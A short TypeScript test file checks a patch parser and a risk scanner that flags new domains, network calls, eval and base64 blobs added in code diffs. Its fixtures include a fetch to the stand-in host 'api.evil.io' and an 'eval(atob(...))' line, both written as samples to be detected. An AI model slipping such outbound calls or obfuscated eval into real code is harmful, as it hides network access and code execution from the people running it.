import assert from "node:assert/strict";
import { parsePatch, scanRisks } from "./diff.ts";
const p = "@@ -10,3 +10,4 @@ fn\n a\n-const u = 'https://old.example/x';\n+const u = 'https://new.example/x';\n+await fetch(\"https://api.evil.io/k\");\n b";
const ls = parsePatch(p);
assert.deepEqual(ls.map((l) => [l.kind, l.old, l.new]), [["hunk", undefined, undefined], ["ctx", 10, 10], ["del", 11, undefined], ["add", undefined, 11], ["add", undefined, 12], ["ctx", 12, 13]]);
const r = scanRisks([{ filename: "providers/x/a.ts", patch: p + "\n+eval(atob('" + "QUJD".repeat(30) + "'))" }]);
assert.deepEqual(r.map((x) => x.kind), ["domain", "domain", "network", "eval", "base64"]);
assert.equal(r[2].what, "fetch → api.evil.io"); assert.equal(r[2].line, 12);
// a URL that the same diff removes isn't "new"
assert.equal(scanRisks([{ filename: "f", patch: "@@ -1 +1 @@\n-x('https://a.io')\n+y('https://a.io')" }]).length, 0);
